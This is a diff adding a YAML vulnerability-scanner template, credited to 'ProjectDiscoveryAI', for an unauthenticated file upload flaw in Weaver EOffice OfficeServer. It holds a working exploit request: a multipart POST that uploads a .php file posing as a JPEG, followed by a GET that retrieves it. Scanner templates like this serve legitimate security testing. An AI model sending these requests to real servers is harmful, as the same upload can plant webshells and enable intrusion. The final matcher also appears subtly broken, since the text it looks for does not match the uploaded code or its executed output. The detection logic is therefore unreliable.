@@ -1,0 +1,42 @@
+id: weaver-eoffice-officeserver-file-upload
+info:
+  name: Weaver EOffice OfficeServer File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a file upload vulnerability in Weaver EOffice OfficeServer allowing unauthenticated attackers to upload arbitrary files.
+variables:
+  randomInt: '{{rand_int(1000000000, 9000000000)}}'
+  randomFileName: '{{rand_text_alphanumeric(20)}}'
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+        Content-Type: image/jpeg
+
+        <?php echo {{randomInt}};?>
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FormData"
+
+        {"USERNAME":"","RECORDID":"undefined","OPTION":"SAVEFILE","FILENAME":"{{randomFileName}}.php"}
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /eoffice10/server/public/iWebOffice2015/Document/{{randomFileName}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?php echo {{randomInt}}; ?>"
